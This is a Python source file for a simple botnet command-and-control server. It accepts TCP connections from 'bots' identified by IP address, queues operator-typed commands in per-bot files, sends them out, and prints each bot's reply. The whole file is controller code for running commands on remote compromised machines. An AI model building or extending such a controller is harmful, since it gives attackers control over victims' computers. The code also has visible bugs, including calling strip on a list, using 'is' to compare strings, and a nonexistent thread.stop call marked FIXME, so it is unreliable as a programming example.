import threading
import socketserver
from os.path import exists

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
	def handle(self):
	
		client_ip = self.client_address[0]
	
		#Gets the connection data
		data = str(self.request.recv(1024), 'ascii')
		self.cur_thread = threading.current_thread()
		#response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
		#self.request.sendall(response)
		
		thread_num = client_ip
		self.cur_thread.name = client_ip
		
		
		if (not exists("./tmpfiles/" + thread_num + ".txt")):
			f = open("tmpfiles/" + thread_num + ".txt", "x")
			f.close()
		while True:
			with open("tmpfiles/" + thread_num + ".txt", 'r+') as file:
				
			#Now, let's figure out how to get it to send commands instead!
				command = file.readline()
				if command:
					self.sendCommand(command)
					file.truncate(0)

	#Handles sending the command to the bot
	# Takes in a command string, and will send it, wait for a response, and then print the response. 
	def sendCommand(self, cmd):
		self.request.sendall(cmd.encode()) #Sends the message over to the bot
		message = self.request.recv(1024).strip().decode() #... and receives the response
		response = bytes("{}: {}".format(self.cur_thread.name, message), 'ascii').decode()
		print(response)



class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
	pass
	
def threads_check(threads):
	for thread in threads:
		name = thread.name
		base = name.split("-")
		base = base[0]
		if base is "Thread":
			thread.stop()    ## FIXME not actually stoping the thread
		#print(name)

	
if __name__ == "__main__":
	# Port 0 means to select an arbitrary unused port
	HOST, PORT = "", 8000
	

	server = ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler)
	
	#Fixes a bug where closing and reopening the server too quickly
	# gives a "port already in use" error

	socketserver.TCPServer.allow_reuse_address = True


	with server:
		ip, port = server.server_address
		print("here")
		# Start a thread with the server -- that thread will then start one
		# more thread for each request
		server_thread = threading.Thread(target=server.serve_forever)
		
		
		# Exit the server thread when the main thread terminates
		server_thread.daemon = True
		server_thread.start()
		print("Server loop running in thread:", server_thread.name)

		while True:
			
			# BELOW is meant to check the threads 
			threads = threading.enumerate()
			#print(threading.activeCount())
			threads_check(threads)
			
			command = input("enter a command:\n")
			bots = input("which bots should run this? ").split(",").strip()
			for bot in bots:
				with open("tmpfiles/" + bot + ".txt", 'w') as file:
					file.write(command)
	#server.shutdown()
